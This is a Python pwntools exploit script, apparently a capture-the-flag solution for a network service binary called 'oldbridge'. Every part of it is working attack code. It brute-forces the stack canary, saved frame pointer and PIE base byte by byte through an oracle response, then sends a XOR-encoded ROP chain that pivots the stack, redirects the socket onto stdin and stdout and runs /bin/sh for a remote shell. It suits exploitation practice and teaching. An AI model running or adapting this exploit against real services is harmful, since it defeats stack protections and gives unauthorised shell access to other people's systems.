#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from pwnlib.term import output

exe = context.binary = ELF('oldbridge')
context.log_level = 'info'

HOST = "154.57.164.73"
PORT = 31436

OFFSET = 1032
CHUNK = b"il{dih"
KEY = 0xD
ORACLE = b"Username found!"

def leak_canary():
    CANARY = b""
    while len(CANARY) < 8:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + CANARY + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found canary byte: %#x", i)
                    CANARY += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(CANARY)

def leak_saved_rbp(canary):
    RBP = b""
    while len(RBP) < 6:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + canary + RBP + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found saved RBP byte: %#x", i)
                    RBP += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(RBP.ljust(8, b"\x00"))


def leak_pie(canary, saved_rbp):
    PIE = b"\xcf"
    while len(PIE) < 6:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + canary + saved_rbp + PIE + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found PIE byte: %#x", i)
                    PIE += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(PIE.ljust(8, b"\x00"))


def solve():

    canary = leak_canary()
    saved_rbp = leak_saved_rbp(p64(canary))
    pie = leak_pie(p64(canary), p64(saved_rbp))

    buffer = saved_rbp - 0x478
    base = pie - 0xecf

    info("Leaked canary: %#x", canary)
    info("Leaked saved RBP: %#x", saved_rbp)
    info("Leaked PIE: %#x", pie)

    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + base
    pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] + base
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] + base
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] + base
    syscall = rop.find_gadget(['syscall', 'ret'])[0] + base
    leave_ret = rop.find_gadget(['leave', 'ret'])[0] + base

    chain = flat(
        [
            u64(b"/bin/sh\x00"), 0xcafebabe,
            pop_rdi, 0x4,
            pop_rsi, 0x0, 0x0,
            pop_rax, 0x21,
            syscall,
            pop_rdi, 0x4,
            pop_rsi, 0x1, 0x0,
            pop_rax, 0x21,
            syscall,
            pop_rdi, buffer,
            pop_rsi, 0x0, 0x0,
            pop_rdx, 0x0,
            pop_rax, 0x3b,
            syscall
        ]
    )

    payload = b"A"*8
    payload += chain
    payload += b"A" * (OFFSET - len(payload))
    payload += p64(canary)
    payload += p64(buffer + 0x8)
    payload += p64(leave_ret)

    io = remote(HOST, PORT)
    io.recvuntil(b"Username: ")
    io.send(xor(payload, KEY))
    io.interactive()
    
if __name__ == "__main__":
    solve()